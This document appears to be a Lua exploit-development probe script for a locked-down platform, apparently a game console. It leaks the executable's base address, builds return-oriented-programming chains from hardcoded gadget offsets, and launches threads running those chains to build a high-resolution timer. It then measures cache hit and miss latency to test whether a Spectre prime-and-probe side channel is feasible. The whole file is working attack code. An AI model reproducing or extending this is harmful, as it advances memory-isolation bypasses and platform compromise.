-- CRASH_CLASS: MODERATE
-- PROBE 1199m: Cache timing via ROP counting timer
--
-- 1199l v4 confirmed: two-child timer works, ~5.6ns/tick, ~101 ticks/560ns.
-- This probe measures cache hit vs miss using before/after counter reads:
--   Group A: 10 reads of SAME address (first cold, rest warm — L1 hits)
--   Group B: 10 reads of DIFFERENT pages (all cold)
-- If A[0] > A[1..9] and B[all] > A[1..9], cache timing works.

print("=== PROBE 1199m: Cache timing measurement ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax     = eb + 0x992
local g_pop_rdi     = eb + 0xC9DFE
local g_pop_rsi     = eb + 0xD77D
local g_bare_ret    = eb + 0x42
local g_mov_m_rax   = eb + 0x92C67
local g_mov_rax_mem = eb + 0x1EEBB

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_mmap = mk(477)

-- Shared data
local shared = memory.alloc(0x400)
local sha = N(shared)
for i = 0, 0x3FC, 4 do wd(sha + i, 0) end

local counter_a = sha
local done_ctr  = sha + 0x10
local done_meas = sha + 0x18
-- before[0..19] at sha+0x40, after[0..19] at sha+0x140
local before_base = sha + 0x40
local after_base  = sha + 0x140

-- =============================================
-- TARGET PAGES: 1 hot + 10 cold
-- =============================================
local hot_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(hot_page) >= 0xFFFF0000 then print("FATAL: hot mmap"); return end
local hot_a = N(hot_page)
wq(hot_a, uint64(0xAAAABBBBCCCCDDDD))

local cold_pages = {}
for c = 1, 10 do
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if get_hi_lo(p) >= 0xFFFF0000 then print("FATAL: cold mmap " .. c); return end
    local pa = N(p)
    wq(pa, uint64(0x1111000000000000 + c))
    cold_pages[c] = pa
end
print(string.format("hot=0x%X  cold[1]=0x%X..cold[10]=0x%X",
    hot_a, cold_pages[1], cold_pages[10]))

-- =============================================
-- COUNTER CHAIN: 200K ticks
-- =============================================
local TICKS = 200000
local ctr_buf = sc_mmap(uint64(0), uint64(0x800000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(ctr_buf) >= 0xFFFF0000 then print("FATAL: ctr mmap"); return end
local ctr_base = N(ctr_buf)
local ss_c = 0x1000
local rsp_c = ctr_base + ss_c - ((ctr_base + ss_c) % 16) - 8

local off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

ec(g_pop_rdi);  ec(uint64(129))
ec(g_pop_rsi);  ec(uint64(N(fs_ptr)))
ec(g_pop_rax);  ec(uint64(165))
ec(stub)
ec(g_pop_rdi);  ec(uint64(counter_a))
for i = 1, TICKS do
    ec(g_pop_rax);  ec(uint64(i))
    ec(g_mov_m_rax)
end
ec(g_pop_rdi);  ec(uint64(done_ctr))
ec(g_pop_rax);  ec(uint64(0xCAFE))
ec(g_mov_m_rax)
ec(g_pop_rdi);  ec(uint64(0))
ec(g_pop_rax);  ec(uint64(431))
ec(stub)

print(string.format("counter: %d ticks", TICKS))

-- =============================================
-- MEASUREMENT CHAIN
-- =============================================
-- Layout: 20 measurements
--   [0..9]:  hot_page same address (first cold, rest warm)
--   [10..19]: cold_pages different addresses (all cold)
-- Each measurement:
--   read counter → before[i]
--   read target
--   read counter → after[i]

local meas_buf = sc_mmap(uint64(0), uint64(0x100000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(meas_buf) >= 0xFFFF0000 then print("FATAL: meas mmap"); return end
local meas_base = N(meas_buf)
local ss_m = 0x1000
local rsp_m = meas_base + ss_m - ((meas_base + ss_m) % 16) - 8

local off_m = 0
local function em(v) wq(rsp_m + off_m, v); off_m = off_m + 8 end

-- sysarch
em(g_pop_rdi);  em(uint64(129))
em(g_pop_rsi);  em(uint64(N(fs_ptr)))
em(g_pop_rax);  em(uint64(165))
em(stub)

-- Helper: emit one measurement (target_addr, measurement_index)
local function emit_measurement(target_addr, idx)
    -- read counter → before[idx]
    em(g_pop_rax);  em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi);  em(uint64(before_base + idx * 8))
    em(g_mov_m_rax)
    -- read target
    em(g_pop_rax);  em(uint64(target_addr))
    em(g_mov_rax_mem)
    -- read counter → after[idx]
    em(g_pop_rax);  em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi);  em(uint64(after_base + idx * 8))
    em(g_mov_m_rax)
end

-- Group A: 10 reads of hot_page (same address)
for i = 0, 9 do
    emit_measurement(hot_a, i)
end

-- Group B: 10 reads of different cold pages
for i = 0, 9 do
    emit_measurement(cold_pages[i + 1], 10 + i)
end

-- done
em(g_pop_rdi);  em(uint64(done_meas))
em(g_pop_rax);  em(uint64(0xBEEF))
em(g_mov_m_rax)
em(g_pop_rdi);  em(uint64(0))
em(g_pop_rax);  em(uint64(431))
em(stub)

print(string.format("measurement: 20 samples, %d bytes", off_m))

-- =============================================
-- LAUNCH
-- =============================================
print("")

-- Counter
local par_c = memory.alloc(0x40)
local pc_ = N(par_c)
for i = 0, 0x3C, 4 do wd(pc_ + i, 0) end
wq(pc_, g_bare_ret)
wq(pc_ + 0x10, uint64(ctr_base))
wq(pc_ + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pc_ + 0x30, tid_c)

print("launching counter...")
pcall(function() mk(455)(uint64(pc_), uint64(0x38)) end)

-- Gate: wait for counter to start
local gate = 0
for p = 1, 50000 do
    local v = rd(counter_a) or 0
    if v > 0 then gate = v; break end
end
print(string.format("gate: counter=%d", gate))
if gate == 0 then print("ABORT: counter not running"); return end

-- Measurement
local par_m = memory.alloc(0x40)
local pm = N(par_m)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq(pm, g_bare_ret)
wq(pm + 0x10, uint64(meas_base))
wq(pm + 0x18, uint64(ss_m))
local tid_m = memory.alloc(8); wq(N(tid_m), uint64(0))
wq(pm + 0x30, tid_m)

print("launching measurement...")
pcall(function() mk(455)(uint64(pm), uint64(0x38)) end)

-- Wait
for w = 1, 100000 do local _ = rd(sha + 0x50) end

if not alive() then print("DEAD"); return end

local dc = rd(done_ctr) or 0
local dm = rd(done_meas) or 0
print(string.format("done_ctr=0x%X  done_meas=0x%X", dc, dm))

-- =============================================
-- RESULTS
-- =============================================
print("")
print("[A] Same address (hot_page) — expect: first cold, rest warm")

local hot_deltas = {}
for i = 0, 9 do
    local b = rq(before_base + i * 8)
    local a = rq(after_base + i * 8)
    local bh, bl = get_hi_lo(b)
    local ah, al = get_hi_lo(a)
    local delta = al - bl
    table.insert(hot_deltas, delta)
    print(string.format("  [%2d] before=%6d  after=%6d  delta=%3d%s",
        i, bl, al, delta, i == 0 and "  <-- COLD" or ""))
end

print("")
print("[B] Different addresses (cold_pages) — expect: all cold")

local cold_deltas = {}
for i = 0, 9 do
    local b = rq(before_base + (10 + i) * 8)
    local a = rq(after_base + (10 + i) * 8)
    local bh, bl = get_hi_lo(b)
    local ah, al = get_hi_lo(a)
    local delta = al - bl
    table.insert(cold_deltas, delta)
    print(string.format("  [%2d] before=%6d  after=%6d  delta=%3d",
        i, bl, al, delta))
end

-- =============================================
-- ANALYSIS
-- =============================================
print("")
print("[ANALYSIS]")

local hot_first = hot_deltas[1]
local hot_sum = 0
for i = 2, #hot_deltas do hot_sum = hot_sum + hot_deltas[i] end
local hot_avg_warm = hot_sum / math.max(#hot_deltas - 1, 1)

local cold_sum = 0
for _, d in ipairs(cold_deltas) do cold_sum = cold_sum + d end
local cold_avg = cold_sum / #cold_deltas

print(string.format("  hot first (cold):  %d ticks", hot_first))
print(string.format("  hot avg (warm):    %.1f ticks", hot_avg_warm))
print(string.format("  cold avg:          %.1f ticks", cold_avg))
print(string.format("  ratio cold/warm:   %.1fx", cold_avg / math.max(hot_avg_warm, 0.1)))

if cold_avg > hot_avg_warm * 1.5 and hot_first > hot_avg_warm * 1.3 then
    print("")
    print("** CACHE TIMING WORKS — cold/warm clearly distinguishable! **")
    print(string.format("  warm ≈ %.0f ns, cold ≈ %.0f ns (at 5.6ns/tick)",
        hot_avg_warm * 5.6, cold_avg * 5.6))
    print("  → Spectre PRIME+PROBE is feasible with this timer")
elseif cold_avg > hot_avg_warm * 1.2 then
    print("")
    print("** MARGINAL — some signal but noisy **")
else
    print("")
    print("** NO CLEAR SIGNAL — deltas too similar **")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199m COMPLETE ===")
